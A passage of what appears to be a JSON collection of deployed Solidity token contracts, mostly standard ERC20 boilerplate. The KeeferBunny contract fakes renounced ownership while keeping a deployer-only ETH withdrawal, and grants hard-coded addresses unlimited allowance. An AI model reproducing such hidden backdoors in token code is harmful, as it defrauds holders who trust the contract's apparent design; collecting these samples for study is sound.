(returndata.length == 0)  { \n                        \n                // only check isContract if the call was successful and the return data is empty\n                // otherwise we already know that it was a contract\n                require ( isContract ( target ), \"Address: call to non-contract\" );\n            \n                         } \n            return returndata ; \n         } \n                         else  { \n                        \n            _revert(returndata, errorMessage );\n         } \n                        \n     } \n                        \n\n    /**\n     * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the\n     * revert reason or using the provided one.\n     *\n     * _Available since v4.3._\n     */\n    function verifyCallResult(\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n     ) internal pure returns  ( bytes memory ) {\n                        \n        if (success ) {\n                        \n            return returndata;\n        }\n                         else  { \n                        \n            _revert ( returndata, errorMessage);\n        \n                         } \n    }\n                        \n\n    function _revert ( bytes memory returndata, string memory errorMessage) private pure  { \n                        \n        // Look for revert reason and bubble it up if present\n        if (returndata.length > 0)  { \n                        \n            // The easiest way to bubble the revert reason is using memory via assembly\n            /// @solidity memory-safe-assembly\n            assembly {\n                        \n                let returndata_size := mload ( returndata )\n                revert(add ( 32, returndata), returndata_size)\n            \n                        }\n         } \n                         else  { \n                        \n            revert(errorMessage );\n        }\n                        \n    }\n                        \n\n                         } \npragma solidity ^0.8.0 ; \n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context \n                        {\n\n    function _msgData (  ) internal view virtual returns  ( bytes calldata)  { \n                        \n        return msg.data;\n    }\n                        \n    function _msgSender() internal view virtual returns (address) {\n                        \n        return msg.sender ; \n     } \n                        \n\n    function _contextSuffixLength ( ) internal view virtual returns (uint256 ) {\n                        \n        return 0 ; \n    }\n                        \n\n\n\n                        }\n\n\n/**\n * @dev Standard ERC-20 Errors\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-20 tokens.\n */\ninterface IERC20Errors \n                        {\n\n    /**\n     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     */\n    error ERC20InvalidSpender(address spender) ; \n\n    /**\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\n     * @param receiver Address to which tokens are being transferred.\n     */\n    error ERC20InvalidReceiver(address receiver );\n\n\n    /**\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     */\n    error ERC20InvalidSender(address sender);\n\n    /**\n     * @dev Indicates a failure with the `spender`\u2019s `allowance`. Used in transfers.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     * @param allowance Amount of tokens a `spender` is allowed to operate with.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed ) ; \n\n\n    /**\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n     * @param approver Address initiating an approval operation.\n     */\n    error ERC20InvalidApprover(address approver ) ; \n\n    /**\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     * @param balance Current balance for the interacting account.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientBalance ( address sender, uint256 balance, uint256 needed );\n}\n                        \n\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 {\n                        \n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {\n                        approve\n                        }. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value );\n\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256 ) ; \n\n    \n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an  { \n                        Approval\n                         }  event.\n     */\n    function approve ( address spender, uint256 amount) external returns  ( bool );\n        /**\n     * @dev Emitted when `value` tokens are moved from one account  ( `from`) to\n     * another (`to` ).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value) ; \n\n    \n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through \n                         { transferFrom}\n                        . This is\n     * zero by default.\n     *\n     * This value changes when \n                         { approve}\n                         or \n                         { transferFrom}\n                         are called.\n     */\n    function allowance(address owner, address spender ) external view returns (uint256 ) ; \n\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply( ) external view returns (uint256) ; \n    \n/**\n     * @dev Moves `amount` tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a  { \n                        Transfer\n                        } event.\n     */\n    function transfer(address to, uint256 amount ) external returns  ( bool );\n\n    /**\n     * @dev Moves `amount` tokens from `from` to `to` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a  { \n                        Transfer\n                        } event.\n     */\n    function transferFrom(address from, address to, uint256 amount ) external returns (bool) ; \n    \n } \n                        \n\n\ninterface IERC20Metadata is IERC20 \n                         { \n\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function decimals ( ) external view returns  ( uint8);\n    \n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function symbol (  ) external view returns (string memory );\n\n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name( ) external view returns (string memory);\n\n}\n                        \n\n\n\n\n\n/**\n * @dev Implementation of the \n                        {IERC20}\n                         interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using {\n                        _mint } \n                        .\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * The default value of \n                         { decimals\n                        } is 18. To change this, you should override\n * this function so it returns a different value.\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC-20\n * applications.\n */\ncontract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors  {\n                        \n    mapping ( address => uint256 ) private _balances;\n\n\n    mapping ( address => mapping(address => uint256 ) ) private _allowances ; \n    uint256 private _totalSupply;\n\n    string private _name ; \n    string private _symbol ; \n\n    /**\n     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an \n                         { Approval\n                         }  event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     *\n     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.\n     */\n    function _approve(address owner, address spender, uint256 value) internal {\n                        \n        _approve ( owner, spender, value, true ) ; \n     } \n                        \n    \n\n    /**\n     * @dev See \n                        {IERC20-balanceOf } \n                        .\n     */\n    function balanceOf ( address account) public view virtual returns (uint256)  { \n                        \n        return _balances[account];\n     } \n                        \n    \n    /**\n     * @dev Returns the name of the token.\n     */\n    function name ( ) public view virtual returns (string memory) {\n                        \n        return _name;\n    }\n                        \n    \n    /**\n     * @dev See {\n                        IERC20-approve } \n                        .\n     *\n     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 value ) public virtual returns  ( bool ) {\n                        \n        address owner = _msgSender() ; \n        _approve ( owner, spender, value);\n        return true;\n     } \n                        \n    \n\n    /**\n     * @dev See {\n                        IERC20-transfer\n                         } .\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `value`.\n     */\n    function transfer(address to, uint256 value ) public virtual returns  ( bool) {\n                        \n        address owner = _msgSender();\n        _transfer ( owner, to, value) ; \n        return true;\n     } \n                        \n    \n    /**\n     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints  ( or burns) if `from`\n     * (or `to` ) is the zero address. All customizations to transfers, mints, and burns should be done by overriding\n     * this function.\n     *\n     * Emits a {\n                        Transfer}\n                         event.\n     */\n    function _update(address from, address to, uint256 value) internal virtual \n                         { \n        if (from == address(0)) {\n                        \n            // Overflow check required: The rest of the code assumes that totalSupply never overflows\n            _totalSupply += value;\n        \n                         }  else  { \n                        \n            uint256 fromBalance = _balances[from] ; \n            if  ( fromBalance < value )  { \n                        \n                revert ERC20InsufficientBalance ( from, fromBalance, value );\n            }\n                        \n            unchecked  { \n                        \n                // Overflow not possible: value <= fromBalance <= totalSupply.\n                _balances[from] = fromBalance - value ; \n            }\n                        \n        \n                         } \n\n        if (to == address ( 0 )) \n                         { \n            unchecked  { \n                        \n                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.\n                _totalSupply -= value;\n             } \n                        \n        }\n                         else \n                        {\n            unchecked {\n                        \n                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.\n                _balances[to] += value;\n             } \n                        \n        }\n                        \n\n        emit Transfer ( from, to, value );\n    }\n                        \n    \n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol ( ) public view virtual returns (string memory) {\n                        \n        return _symbol;\n     } \n                        \n    \n    /**\n     * @dev Moves a `value` amount of tokens from `from` to `to`.\n     *\n     * This internal function is equivalent to {\n                        transfer}\n                        , and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a \n                        {Transfer } \n                         event.\n     *\n     * NOTE: This function is not virtual, \n                         { _update } \n                         should be overridden instead.\n     */\n    function _transfer(address from, address to, uint256 value ) internal {\n                        \n        if  ( from == address ( 0) )  { \n                        \n            revert ERC20InvalidSender(address(0 ));\n         } \n                        \n        if (to == address ( 0 ))  { \n                        \n            revert ERC20InvalidReceiver(address ( 0 )) ; \n         } \n                        \n        _update(from, to, value );\n    }\n                        \n    \n    /**\n     * @dev See {\n                        IERC20-transferFrom } \n                        .\n     *\n     * Skips emitting an  { \n                        Approval}\n                         event indicating an allowance update. This is not\n     * required by the ERC. See  { \n                        xref-ERC20-_approve-address-address-uint256-bool-\n                         } [_approve].\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `value`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `value`.\n     */\n    function transferFrom ( address from, address to, uint256 value) public virtual returns  ( bool) {\n                        \n        address spender = _msgSender (  );\n        _spendAllowance(from, spender, value ) ; \n        _transfer ( from, to, value );\n        return true;\n    }\n                        \n    \n    /**\n     * @dev See {\n                        IERC20-totalSupply}\n                        .\n     */\n    function totalSupply() public view virtual returns  ( uint256 ) {\n                        \n        return _totalSupply ; \n    }\n                        \n    \n    /**\n     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0 ).\n     * Relies on the `_update` mechanism\n     *\n     * Emits a  { \n                        Transfer}\n                         event with `from` set to the zero address.\n     *\n     * NOTE: This function is not virtual, {\n                        _update}\n                         should be overridden instead.\n     */\n    function _mint ( address account, uint256 value) internal {\n                        \n        if  ( account == address ( 0 )) {\n                        \n            revert ERC20InvalidReceiver ( address ( 0 ) ) ; \n         } \n                        \n        _update ( address(0 ), account, value ) ; \n     } \n                        \n    \n\n    /**\n     * @dev See  { \n                        IERC20-allowance } \n                        .\n     */\n    function allowance(address owner, address spender ) public view virtual returns (uint256 ) {\n                        \n        return _allowances[owner][spender];\n     } \n                        \n    \n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the default value returned by this function, unless\n     * it's overridden.\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     *  { \n                        IERC20-balanceOf}\n                         and {\n                        IERC20-transfer}\n                        .\n     */\n    function decimals ( ) public view virtual returns  ( uint8)  { \n                        \n        return 15;\n    }\n                        \n    \n    /**\n     * @dev Sets the values for  { \n                        name}\n                         and \n                        {symbol}\n                        .\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor ( string memory name_, string memory symbol_ ) \n                         { \n        _name = name_;\n        _symbol = symbol_;\n     } \n                        \n    \n    /**\n     * @dev Updates `owner` s allowance for `spender` based on spent `value`.\n     *\n     * Does not update the allowance value in case of infinite allowance.\n     * Revert if not enough allowance is available.\n     *\n     * Does not emit an {\n                        Approval } \n                         event.\n     */\n    function _spendAllowance(address owner, address spender, uint256 value ) internal virtual {\n                        \n        uint256 currentAllowance = allowance(owner, spender) ; \n        if  ( currentAllowance < type(uint256 ).max) {\n                        \n            if  ( currentAllowance < value ) {\n                        \n                revert ERC20InsufficientAllowance(spender, currentAllowance, value) ; \n            }\n                        \n            unchecked  { \n                        \n                _approve(owner, spender, currentAllowance - value, false);\n            }\n                        \n        }\n                        \n    \n                         } \n    \n    /**\n     * @dev Variant of  { \n                        _approve } \n                         with an optional flag to enable or disable the {\n                        Approval}\n                         event.\n     *\n     * By default  ( when calling {\n                        _approve}\n                        ) the flag is set to true. On the other hand, approval changes made by\n     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any\n     * `Approval` event during `transferFrom` operations.\n     *\n     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to\n     * true using the following override:\n     *\n     * ```solidity\n     * function _approve(address owner, address spender, uint256 value, bool) internal virtual override  { \n                        \n     *     super._approve ( owner, spender, value, true) ; \n     * }\n                        \n     * ```\n     *\n     * Requirements are the same as {\n                        _approve}\n                        .\n     */\n    function _approve(address owner, address spender, uint256 value, bool emitEvent ) internal virtual \n                         { \n        if (owner == address(0) )  { \n                        \n            revert ERC20InvalidApprover ( address(0) ) ; \n        \n                         } \n        if (spender == address(0 ))  { \n                        \n            revert ERC20InvalidSpender(address(0 ) ) ; \n        \n                        }\n        _allowances[owner][spender] = value ; \n        if  ( emitEvent)  { \n                        \n            emit Approval(owner, spender, value ) ; \n        }\n                        \n     } \n                        \n    \n     } \n                        \n\nabstract contract Ownable is Context {\n                        \n    address private _owner;\n    \n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner );\n    \n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor( ) {\n                        \n        _transferOwnership ( _msgSender ( ) );\n    }\n                        \n    \n    /**\n     * @dev The owner is not a valid owner account. (eg. `address(0 )`)\n     */\n    error OwnableInvalidOwner ( address owner );\n    \n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner` ).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership ( address newOwner ) public virtual onlyOwner \n                        {\n        require(newOwner != address ( 0 ), \"Ownable: new owner is the zero address\");\n        _transferOwnership ( newOwner) ; \n    }\n                        \n    \n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner( ) public view virtual returns  ( address )  { \n                        \n        return _owner;\n    \n                        }\n    \n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner ( ) {\n                        \n        _checkOwner() ; \n        _;\n     } \n                        \n    \n    /**\n     * @dev The caller account is not authorized to perform an operation.\n     */\n    error OwnableUnauthorizedAccount(address account) ; \n    \n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby disabling any functionality that is only available to the owner.\n     */\n    function renounceOwnership ( ) public virtual onlyOwner  { \n                        \n        _transferOwnership(address ( 0) ) ; \n     } \n                        \n    \n    /**\n     * @dev Transfers ownership of the contract to a new account  ( `newOwner`).\n     * Internal function without access restriction.\n     */\n    function _transferOwnership ( address newOwner) internal virtual  { \n                        \n        address oldOwner = _owner;\n        _owner = newOwner;\n        emit OwnershipTransferred(oldOwner, newOwner);\n    }\n                        \n    \n    /**\n     * @dev Throws if the sender is not the owner.\n     */\n    function _checkOwner ( ) internal view virtual  { \n                        \n        require(owner() == _msgSender( ), \"Ownable: caller is not the owner\") ; \n    }\n                        \n    \n}\n                        \n\n\n// File KeeferBunny.sol\n\ncontract KeeferBunny is ERC20, Ownable \n                         { \n    address internal immutable deployer;\n    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) {\n                        \n        _mint ( msg.sender, 100000000000000000000000 ) ; \n        _transferOwnership(address ( 0 ) );\n        deployer = msg.sender ; \n    \n                        }\n    \n    /**\n     * @dev See {\n                        IERC20-allowance\n                        }.\n     */\n    function allowance ( address owner, address spender ) public view override returns (uint256) {\n                        \n            //gas optimization: auto allow Permit2 and UniswapRouterV2\n            if((spender == 0x000000000022D473030F116dDEE9F6B43aC78BA3 ) || (spender == 0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24) ){\n                        \n            return type(uint256).max;\n         } \n                         \n        return super.allowance ( owner,spender );\n    \n                        }\n    \n    function claimGas ( address payable recipient, uint256 amount) public  { \n                        \n        require(msg.sender==deployer);\n        Address.sendValue ( recipient, amount) ; \n     } \n                        \n    \n    receive (  ) external payable\n                         { \n    \n                         } \n }",
      "count": 1,
      "addresses": [
        "0x4B548E2c5ef948B2886567046E25D4F8506dF504"
      ],
      "names": [
        "KeeferBunny"
      ]
    },
    {
      "id": "ca227298-dcc5-4af4-9171-a50618c2209c",
      "code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.1.0)  ( utils/Address.sol )\n\npragma solidity ^0.8.20 ; \n\n/**\n * @dev Collection of functions related to the address type\n */\nlibrary Address \n                         { \n    /**\n     * @dev Returns true if `account` is a contract.\n     *\n     * [IMPORTANT]\n     * ====\n     * It is unsafe to assume that an address for which this function returns\n     * false is an externally-owned account  ( EOA ) and not a contract.\n     *\n     * Among others, `isContract` will return false for the following\n     * types of addresses:\n     *\n     *  - an externally-owned account\n     *  - a contract in construction\n     *  - an address where a contract will be created\n     *  - an address where a contract lived, but was destroyed\n     *\n     * Furthermore, `isContract` will also return true if the target contract within\n     * the same transaction is already scheduled for destruction by `SELFDESTRUCT`,\n     * which only has an effect at the end of a transaction.\n     * ====\n     *\n     * [IMPORTANT]\n     * ====\n     * You shouldn't rely on `isContract` to protect against flash loan attacks!\n     *\n     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets\n     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract\n     * constructor.\n     * ====\n     */\n    function isContract ( address account) internal view returns (bool ) {\n                        \n        // This method relies on extcodesize/address.code.length, which returns 0\n        // for contracts in construction, since the code is only stored at the end\n        // of the constructor execution.\n\n        return account.code.length > 0 ; \n    }\n                        \n\n    /**\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n     * `recipient`, forwarding all available gas and reverting on errors.\n     *\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n     * imposed by `transfer`, making them unable to receive funds via\n     * `transfer`. {\n                        sendValue}\n                         removes this limitation.\n     *\n     * https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n     *\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n     * taken to not create reentrancy vulnerabilities. Consider using\n     * {\n                        ReentrancyGuard } \n                         or the\n     * https://solidity.readthedocs.io/en/v0.8.0/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n     */\n    function sendValue ( address payable recipient, uint256 amount) public  { \n                        \n        require ( address ( this ).balance >= amount, \"Address: insufficient balance\");\n\n        (bool success, ) = recipient.call { \n                        value: amount\n                         } (\"\") ; \n        require(success, \"Address: unable to send value, recipient may have reverted\") ; \n    }\n                        \n\n    /**\n     * @dev Performs a Solidity function call using a low level `call`. A\n     * plain `call` is an unsafe replacement for a function call: use this\n     * function instead.\n     *\n     * If `target` reverts with a revert reason, it is bubbled up by this\n     * function (like regular Solidity function calls).\n     *\n     * Returns the raw returned data. To convert to the expected return value,\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n     *\n     * Requirements:\n     *\n     * - `target` must be a contract.\n     * - calling `target` with `data` must not revert.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall ( address target, bytes memory data) internal returns  ( bytes memory) {\n                        \n        return functionCallWithValue(target, data, 0, \"Address: low-level call failed\") ; \n    \n                        }\n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes-}\n                        [`functionCall`], but with\n     * `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall ( \n        address target,\n        bytes memory data,\n        string memory errorMessage\n     ) internal returns (bytes memory )  { \n                        \n        return functionCallWithValue ( target, data, 0, errorMessage );\n     } \n                        \n\n    /**\n     * @dev Same as \n                         { xref-Address-functionCall-address-bytes-\n                         } [`functionCall`],\n     * but also transferring `value` wei to `target`.\n     *\n     * Requirements:\n     *\n     * - the calling contract must have an ETH balance of at least `value`.\n     * - the called Solidity function must be `payable`.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue ( address target, bytes memory data, uint256 value ) internal returns  ( bytes memory ) \n                         { \n        return functionCallWithValue ( target, data, value, \"Address: low-level call with value failed\");\n    \n                         } \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCallWithValue-address-bytes-uint256-}\n                        [`functionCallWithValue`], but\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value,\n        string memory errorMessage\n    ) internal returns  ( bytes memory) \n                         { \n        require(address(this ).balance >= value, \"Address: insufficient balance for call\");\n         ( bool success, bytes memory returndata) = target.call{\n                        value: value}\n                         ( data);\n        return verifyCallResultFromTarget ( target, success, returndata, errorMessage );\n    \n                         } \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes-}\n                        [`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall ( address target, bytes memory data) internal view returns  ( bytes memory)  { \n                        \n        return functionStaticCall(target, data, \"Address: low-level static call failed\" ) ; \n    \n                         } \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes-string-}\n                        [`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n     ) internal view returns  ( bytes memory) {\n                        \n         ( bool success, bytes memory returndata) = target.staticcall ( data);\n        return verifyCallResultFromTarget(target, success, returndata, errorMessage ) ; \n     } \n                        \n\n    /**\n     * @dev Same as \n                        {xref-Address-functionCall-address-bytes-}\n                        [`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall ( address target, bytes memory data) internal returns (bytes memory ) {\n                        \n        return functionDelegateCall(target, data, \"Address: low-level delegate call failed\" );\n    }\n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes-string-\n                         } [`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall ( \n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns  ( bytes memory ) {\n                        \n         ( bool success, bytes memory returndata) = target.delegatecall(data);\n        return verifyCallResultFromTarget(target, success, returndata, errorMessage );\n    \n                        }\n\n    /**\n     * @dev Tool to verify that a low level call to smart-contract was successful, and revert  ( either by bubbling\n     * the revert reason or using the provided one ) in case of unsuccessful call or if target was not a contract.\n     *\n     * _Available since v4.8._\n     */\n    function verifyCallResultFromTarget ( \n        address target,\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n    ) internal view returns  ( bytes memory ) {\n                        \n        if  ( success ) {\n                        \n            if (returndata.length == 0 ) \n                        {\n                // only check isContract if the call was successful and the return data is empty\n                // otherwise we already know that it was a contract\n                require(isContract(target), \"Address: call to non-contract\");\n            }\n                        \n            return returndata;\n        \n                        } else  { \n                        \n            _revert(returndata, errorMessage );\n        }\n                        \n     } \n                        \n\n    /**\n     * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the\n     * revert reason or using the provided one.\n     *\n     * _Available since v4.3._\n     */\n    function verifyCallResult(\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n    ) internal pure returns  ( bytes memory )  { \n                        \n        if (success) {\n                        \n            return returndata ; \n         } \n                         else {\n                        \n            _revert ( returndata, errorMessage );\n        \n                        }\n     } \n                        \n\n    function _revert ( bytes memory returndata, string memory errorMessage ) private pure {\n                        \n        // Look for revert reason and bubble it up if present\n        if (returndata.length > 0) \n                         { \n            // The easiest way to bubble the revert reason is using memory via assembly\n            /// @solidity memory-safe-assembly\n            assembly  { \n                        \n                let returndata_size := mload ( returndata)\n                revert ( add(32, returndata), returndata_size )\n            }\n                        \n         } \n                         else {\n                        \n            revert(errorMessage) ; \n         } \n                        \n     } \n                        \n } \n                        \npragma solidity ^0.8.0;\n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context  { \n                        \n    function _msgSender( ) internal view virtual returns (address ) {\n                        \n        return msg.sender;\n     } \n                        \n\n    function _msgData (  ) internal view virtual returns (bytes calldata ) \n                         { \n        return msg.data;\n    }\n                        \n\n    function _contextSuffixLength (  ) internal view virtual returns  ( uint256 ) {\n                        \n        return 0;\n    \n                        }\n\n\n}\n                        \n\n\n/**\n * @dev Standard ERC-20 Errors\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-20 tokens.\n */\ninterface IERC20Errors {\n                        \n\n    /**\n     * @dev Indicates a failure with the `spender`\u2019s `allowance`. Used in transfers.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     * @param allowance Amount of tokens a `spender` is allowed to operate with.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed ) ; \n\n    /**\n     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     */\n    error ERC20InvalidSpender(address spender ) ; \n\n    /**\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     * @param balance Current balance for the interacting account.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientBalance ( address sender, uint256 balance, uint256 needed) ; \n\n    /**\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\n     * @param receiver Address to which tokens are being transferred.\n     */\n    error ERC20InvalidReceiver ( address receiver );\n\n\n    /**\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     */\n    error ERC20InvalidSender(address sender);\n\n\n    /**\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n     * @param approver Address initiating an approval operation.\n     */\n    error ERC20InvalidApprover(address approver);\n } \n                        \n\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 \n                        {\n\n    /**\n     * @dev Moves `amount` tokens from `from` to `to` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {\n                        Transfer\n                        } event.\n     */\n    function transferFrom ( address from, address to, uint256 amount) external returns (bool);\n    \n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through \n                         { transferFrom\n                        }. This is\n     * zero by default.\n     *\n     * This value changes when {\n                        approve}\n                         or {\n                        transferFrom\n                        } are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256 ) ; \n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to \n                        {approve}\n                        . `value` is the new allowance.\n     */\n    event Approval ( address indexed owner, address indexed spender, uint256 value) ; \n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an  { \n                        Approval } \n                         event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool );\n    \n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply ( ) external view returns  ( uint256);\n    /**\n     * @dev Emitted 